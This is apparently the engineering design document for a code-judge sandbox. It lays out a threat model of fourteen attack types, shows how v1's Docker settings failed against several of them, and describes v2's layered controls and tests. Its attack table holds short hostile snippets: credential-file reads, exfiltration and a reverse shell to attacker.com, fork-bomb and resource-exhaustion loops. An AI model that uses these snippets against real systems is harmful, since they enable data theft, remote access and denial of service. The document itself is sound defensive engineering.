# Sandbox deep dive

> This is the most important document in the folder. It is where most of the
> engineering in this project lives, and the security properties it describes
> are the ones the whole platform depends on.

---

## 1. The problem, stated honestly

The platform runs code written by people we do not trust, on our hardware.
That sentence should be uncomfortable, because it describes the same situation
as a remote code execution vulnerability. The difference between a code-judge
and an RCE is **entirely** the quality of the confinement.

So the correct frame is not "how do I run this code" but:

> Assume the submitted program is written by someone actively trying to
> compromise the host. What can it do, and what stops it?

Everything below follows from that.

## 2. What an attacker actually tries

These are not hypothetical. They are the standard playbook, in rough order of
how often they are attempted.

| # | Attack | What it looks like |
| --- | --- | --- |
| 1 | **Read the filesystem** | `open('/app/.env').read()`, steal database credentials, the JWT secret, the API key |
| 2 | **Read the answer key** | `open('/app/questions.json')`, or query the database directly with the credentials from #1 |
| 3 | **Network exfiltration** | `requests.post('http://attacker.com', data=secrets)` |
| 4 | **Reverse shell** | `socket.connect(('attacker.com', 4444))` then `dup2` onto `/bin/sh` |
| 5 | **Fork bomb** | `while True: os.fork()`, exhaust host PIDs, deny service to everyone |
| 6 | **Memory exhaustion** | `bytearray(10**10)`, trigger the host OOM killer, which may kill something else |
| 7 | **Disk exhaustion** | `while True: f.write('A'*10**6)`, fill the host volume |
| 8 | **CPU exhaustion** | `while True: pass`, hold a worker slot forever |
| 9 | **Output flooding** | `while True: print('A'*10**6)`. OOM the *supervising process*, not the sandbox |
| 10 | **Privilege escalation** | Exploit a setuid binary present in the base image |
| 11 | **Container escape** | Mount the host filesystem via `CAP_SYS_ADMIN`; or reach the Docker socket |
| 12 | **Persistence** | Overwrite `/usr/bin/python3` so the *next* candidate's run is compromised |
| 13 | **Cryptomining** | Just… run a miner. Quiet, profitable, and often unnoticed for months |
| 14 | **Kernel exploit** | A syscall bug that escapes namespaces entirely |

## 3. What v1 did, and why each gap mattered

```javascript
// v1: Task4/backend/src/evaluation/dockerRunner.js
const args = [
  "run", "--rm",
  "--network", "none",
  "--cpus", "1",
  "--memory", "256m",
  "-e", `CODE_B64=${codeB64}`,
  profile.image,
  "sh", "-c", profile.command
];
```

Three controls. Here is what each of the fourteen attacks does against it:

| Attack | v1 outcome |
| --- | --- |
| 1, 2 Filesystem read | **Contained**, but only by luck. The container has its own filesystem, so `.env` is not there. However the rootfs is *writable* and the process is *root inside the container*. |
| 3, 4 Network | **Blocked** by `--network none`. This one v1 got right. |
| 5 Fork bomb | **NOT BLOCKED.** No `--pids-limit`. A fork bomb inside a container exhausts the host's PID namespace. This is a live denial-of-service against the whole machine. |
| 6 Memory | Blocked by `--memory 256m`, **but** `--memory-swap` was not set, so the container could swap and exceed the cap. |
| 7 Disk | **NOT BLOCKED.** Writable rootfs, no size limit, no `ulimit fsize`. |
| 8 CPU | Partially, a 10s timeout existed, but `child.kill()` kills the `docker` client process, not necessarily the container. |
| 9 Output flood | **NOT BLOCKED.** Output accumulated in a Node string with no cap. A print loop OOMs the *worker*. |
| 10 Privilege escalation | **NOT BLOCKED.** No `no-new-privileges`. Process runs as uid 0. |
| 11 Escape | **NOT BLOCKED.** All Linux capabilities retained, including `CAP_SYS_ADMIN`. |
| 12 Persistence | **NOT BLOCKED** in principle, writable rootfs. Mitigated only because `--rm` discards the container. |
| 13 Mining | Blocked, incidentally, by no network. |
| 14 Kernel exploit | Not blocked. Nothing short of a VM blocks this. |

The most serious is #5. `while true; do :& done` in a v1 container takes the
host down. There is no exotic knowledge required, it is a first-week-of-Unix
prank.

The second most serious is #11: retaining `CAP_SYS_ADMIN` while running as root
is the configuration every container-escape write-up begins with.

## 4. The design

Defence in depth: assume every individual control will eventually fail, and
layer them so that no single failure is a breach.

```
┌────────────────────────────────────────────────────────────────┐
│ Host                                                           │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Container (namespaces: pid, net, mnt, ipc, uts, user)    │  │
│  │  ┌────────────────────────────────────────────────────┐  │  │
│  │  │ cgroups: memory=256m, swap=0, cpu=1.0, pids=64     │  │  │
│  │  │  ┌──────────────────────────────────────────────┐  │  │  │
│  │  │  │ Process: uid 65534, caps=∅, no-new-privs     │  │  │  │
│  │  │  │  ┌────────────────────────────────────────┐  │  │  │  │
│  │  │  │  │ rlimits: nofile=256 fsize=32M core=0   │  │  │  │  │
│  │  │  │  │  ┌──────────────────────────────────┐  │  │  │  │  │
│  │  │  │  │  │ rootfs: READ-ONLY                │  │  │  │  │  │
│  │  │  │  │  │ /box: tmpfs, noexec*, nosuid,    │  │  │  │  │  │
│  │  │  │  │  │       nodev, 32MB                │  │  │  │  │  │
│  │  │  │  │  │        [ candidate code ]        │  │  │  │  │  │
│  │  │  │  │  └──────────────────────────────────┘  │  │  │  │  │
│  │  │  │  └────────────────────────────────────────┘  │  │  │  │
│  │  │  └──────────────────────────────────────────────┘  │  │  │
│  │  └────────────────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────────────────┘  │
│  Supervisor: wall-clock timeout, bounded output reader         │
└────────────────────────────────────────────────────────────────┘

* exec is permitted only for compiled languages, which must run the
  artefact they produce. Interpreted languages get noexec.
```

## 5. Every control, and the attack it blocks

From `crucible/evaluation/sandbox/docker_backend.py`:

### `network_disabled=True`
**Blocks:** exfiltration (#3), reverse shells (#4), mining (#13), and using our
IP address to attack third parties.
**How:** the container gets an empty network namespace, no interfaces except
loopback. Not a firewall rule that could be misconfigured; there is simply no
route to anywhere.

### `cap_drop=["ALL"]`
**Blocks:** container escape (#11), privilege escalation (#10).
**Why it matters:** Docker grants ~14 capabilities by default. The dangerous
ones for a code judge:
- `CAP_SYS_ADMIN`: mount filesystems. The starting point of most escape write-ups.
- `CAP_NET_RAW`: raw sockets, ARP spoofing (moot with no network, but defence in depth).
- `CAP_SYS_PTRACE`: attach to other processes and read their memory.
- `CAP_DAC_OVERRIDE`: bypass file permission checks.
A program that needs to read stdin and write stdout needs *none* of these.

### `security_opt=["no-new-privileges:true"]`
**Blocks:** privilege escalation via setuid (#10).
**How:** sets the `PR_SET_NO_NEW_PRIVS` process flag. Even if the base image
contains a setuid-root binary, executing it cannot gain privileges. This closes
the gap where dropping capabilities is insufficient because the process can
*re-acquire* them through a setuid helper.

### `read_only=True`
**Blocks:** persistence (#12), disk exhaustion (#7).
**Why:** without it, code can overwrite `/usr/lib/python3.12/random.py`. In a
pooled container that means **the next candidate's submission runs modified
library code**, which is the most serious consequence of pooling, and the
read-only rootfs closes it at the root.

### `tmpfs={WORKDIR: "rw,noexec,nosuid,nodev,size=32m"}`
The rootfs is read-only, so the program needs *somewhere* to write.
- **tmpfs**: RAM-backed, so nothing touches host disk and everything vanishes on container stop.
- **size=32m**: bounded; a write loop hits ENOSPC instead of filling anything.
- **noexec**: for interpreted languages, a downloaded/written binary cannot be executed at all. Compiled languages need `exec` to run their own artefact, so they get it. That per-language distinction is deliberate: the weaker setting is granted only where it is actually required.
- **nosuid**: setuid bits on files here are ignored.
- **nodev**: device nodes here are not honoured, so a crafted `/box/mem` is inert.

### `pids_limit=64`
**Blocks:** fork bombs (#5). **This is the control v1 was missing.**
**How:** the pids cgroup controller caps processes in the container. `fork()`
returns `EAGAIN` at the 65th. The bomb fails immediately and harmlessly instead
of exhausting host PIDs.

### `mem_limit == memswap_limit`
**Blocks:** memory exhaustion (#6).
**The subtlety:** setting `mem_limit` alone is not enough. Docker's
`memory-swap` defaults to *twice* `memory`, so a 256 MB limit silently permits
512 MB of memory+swap. Setting them equal disables swap entirely. The process
is OOM-killed at the real limit, and we detect it via `State.OOMKilled`.

### `user="65534:65534"`
**Blocks:** everything that requires root, as a final backstop (#10, #11, #12).
**Why:** this is the layer that assumes every layer above it failed. Even then,
the process is `nobody`, it cannot write to root-owned paths, cannot bind
privileged ports, cannot use the capabilities it does not have.

### `ulimits`
- `nofile=256`: cannot exhaust host file descriptors.
- `fsize=32MB`: cannot write a huge file even into the tmpfs.
- `core=0`: no core dumps; a crashing program does not write its memory to disk.
- `nproc`: a second, per-uid backstop behind `pids_limit`.

### Bounded output reader
**Blocks:** output flooding (#9). **This one is subtle and worth understanding.**

`while True: print('A' * 10**6)` produces gigabytes. The container memory limit
does **not** help, those bytes are streamed *out* of the container to the
supervising process. If the supervisor buffers the whole stream (which both
`docker exec_run()` and `subprocess.communicate()` do), one submission OOMs the
worker.

The fix is to read incrementally, stop storing after 64 KB, but **keep
draining** the pipe:

```python
if total >= limit:
    flag[0] = True
    continue          # discard, but keep reading
```

Not draining is its own bug: the pipe buffer fills, the child blocks forever in
`write()`, and it never exits, so the timeout path never observes it finish.

This is the kind of detail that separates a code judge that works in a demo
from one that survives a hostile user. It was found by writing the test, not by
reading the code.

### Wall-clock timeout, killing the process *group*
**Blocks:** CPU exhaustion (#8), and anything that hangs.
**The subtlety:** killing only the direct child orphans its grandchildren.
`subprocess.Popen(...)` inside submitted code survives, and one leaked process
per submission accumulates. We `setsid()` the child and `killpg()` the group.

A CPU rlimit alone is insufficient: `time.sleep(999)` consumes no CPU and would
sail past `RLIMIT_CPU` while holding a worker slot for sixteen minutes.

### Source delivered as a tar stream
v1 base64-encoded source into an `sh -c` command string. Two problems:
1. **ARG_MAX.** A large submission exceeds the maximum command-line length and the run fails with a confusing error.
2. **The shell parses untrusted input.** Even base64-encoded, this puts a shell in the path of attacker-controlled data, which is a category of risk worth removing entirely.

We `put_archive()` a tar stream instead. Where a shell is genuinely needed (stdin
redirection), argv is passed through positional parameters:

```python
["sh", "-c", 'exec "$@" < /box/stdin', "sh", *argv]
```

Nothing user-controlled is ever parsed by the shell, the redirect target is a
constant path we chose.

## 6. The summary table

| Attack | Control | Result |
| --- | --- | --- |
| Filesystem read | mount namespace + read-only rootfs + uid 65534 | Contained |
| Answer-key theft | no network + no host mounts | Contained |
| Exfiltration | `network_disabled` | Blocked |
| Reverse shell | `network_disabled` | Blocked |
| **Fork bomb** | **`pids_limit=64`** | **Blocked (v1: host DoS)** |
| Memory bomb | `mem_limit == memswap_limit`, OOM detection | Blocked |
| Disk fill | read-only rootfs, 32 MB tmpfs, `fsize` | Blocked |
| CPU spin | wall-clock timeout + killpg | Blocked |
| **Output flood** | **bounded streaming reader** | **Blocked (v1: worker OOM)** |
| Privilege escalation | `cap_drop=ALL`, `no-new-privileges`, uid 65534 | Blocked |
| **Container escape** | **`cap_drop=ALL`, non-root, seccomp** | **Hardened (v1: wide open)** |
| Persistence | read-only rootfs, workspace wipe, bounded reuse | Blocked |
| Cryptomining | no network + CPU cap + timeout | Blocked |
| **Kernel exploit** | none | **NOT BLOCKED. See §8.** |

## 7. The warm pool trade-off

Container creation costs 300 to 800 ms. A 20-test-case question paying that per
case spends 6 to 16 seconds on overhead alone.

So containers are pooled: they idle on `sleep infinity` and each run is an
`exec`. Acquire drops from ~500 ms to ~1 ms.

**This is a real isolation regression and must be treated as one.** A container
now serves submissions from different users. Mitigations, in order:

1. **Kill stray processes** between runs (`pkill -9 -u 65534`). A previous submission may have backgrounded something.
2. **Wipe the workspace.** Otherwise the next candidate could read the previous one's source, answer leakage on a shared question.
3. **Bounded reuse** (default 50). Caps how far any residue we failed to clean can propagate.
4. **Fail closed.** If the reset itself errors, the container is retired rather than returned to the pool.
5. **Read-only rootfs** (§5) means the most dangerous form of contamination, modifying an interpreter, is impossible regardless.

Residual risk: a contamination channel not anticipated. Bounded reuse limits
blast radius; it does not eliminate it. `SANDBOX_POOL_ENABLED=false` reverts to
per-submission containers, which is the correct setting for genuinely
adversarial users.

## 8. What this does not stop

**A kernel exploit.** Containers are namespaces plus cgroups plus capabilities,
all enforced by a kernel that is *shared with the host*. A syscall bug
(Dirty COW, Dirty Pipe, various io_uring issues) escapes all of it.

Nothing in this document changes that. Mitigating it requires a different
isolation boundary:

| Approach | Isolation | Overhead | When it is worth it |
| --- | --- | --- | --- |
| Containers (this) | Namespaces, shared kernel | ~1 ms pooled | Known/semi-trusted users |
| gVisor (`runsc`) | Userspace syscall interception | 10 to 30% syscall cost | Untrusted public users |
| Firecracker | Hardware virtualisation | ~125 ms boot | Genuinely adversarial, multi-tenant |

The `SandboxBackend` interface exists so this is a one-function change
(`build_sandbox()`), not a rewrite. The point of naming the limit precisely is
that it tells you what the next isolation step is, and when it becomes worth
paying for.

**Also not stopped:** side channels (timing, cache) that could in principle leak
information between pooled runs. Out of scope for this threat model, and worth
saying so rather than pretending it was considered and solved.

## 9. Testing it

Security controls that are not tested are aspirations. `tests/unit/test_sandbox.py`
executes the attacks:

```python
def test_fork_bomb_does_not_take_down_the_host(sandbox):
    result = run(sandbox, "import os\nwhile True:\n    os.fork()\n", timeout=3)
    assert result.outcome in (RUNTIME_ERROR, TIMEOUT, MEMORY_EXCEEDED)
    assert result.duration_ms < 6000

def test_output_flood_is_bounded_and_does_not_grow_the_worker(sandbox):
    result = run(sandbox, "for _ in range(10**8): print('A'*100)", timeout=2)
    assert len(result.stdout) < settings.sandbox_max_output_bytes + 200

def test_forked_children_are_contained_and_leave_no_orphans(sandbox):
    ...
    surviving = subprocess.run(["pgrep", "-fa", marker], ...).stdout
    assert not surviving
```

That last test asserts *containment*, not a specific mechanism, either
`RLIMIT_NPROC` refuses the fork or the timeout kills the group, and both are a
pass. Testing the mechanism instead of the property makes the test brittle
without making the system safer.

## 10. Common questions

**"How do you stop someone reading your database credentials?"**
> They're not in the container. Separate mount namespace, no host bind mounts,
> and no environment variables beyond the language runtime's own. Even if they
> were, there's no network, so nothing could be sent anywhere.

**"What if they fork bomb you?"**
> `pids_limit=64`. The 65th `fork()` returns EAGAIN. This is the one v1 was
> missing, and it was a live host DoS: `while true; do :& done` would take the
> machine down.

**"Their code runs an infinite print loop. What happens?"**
> This is the interesting one. The container memory limit does not help here,
> because the bytes leave the container. I read the stream incrementally and stop
> storing at 64 KB, but keep draining the pipe. If you stop reading, the pipe
> buffer fills, the child blocks in `write()` forever, and it never exits, so
> your timeout never fires. Both halves matter.

**"Could they escape the container?"**
> All capabilities dropped, `no-new-privileges`, running as uid 65534, read-only
> rootfs. That closes the configurations every escape write-up starts from. But
> a kernel exploit escapes, because containers share the host kernel. That is
> the honest limit. For genuinely untrusted load you'd want gVisor or Firecracker,
> and I put it behind an interface so that's a one-function change.

**"You reuse containers between users. Isn't that a security problem?"**
> Yes, and it's a deliberate trade. Container start is 300 to 800 ms and a 20-case
> question pays it 20 times. So between runs I kill stray processes, wipe the
> tmpfs workspace, and cap reuse at 50. The read-only rootfs matters most here:
> the worst contamination would be modifying an interpreter so that the next
> candidate runs altered code, and that is impossible regardless. If the reset
> fails I retire the container instead of reusing it. And it's a config flag,
> so for hostile users you turn it off and take the latency.
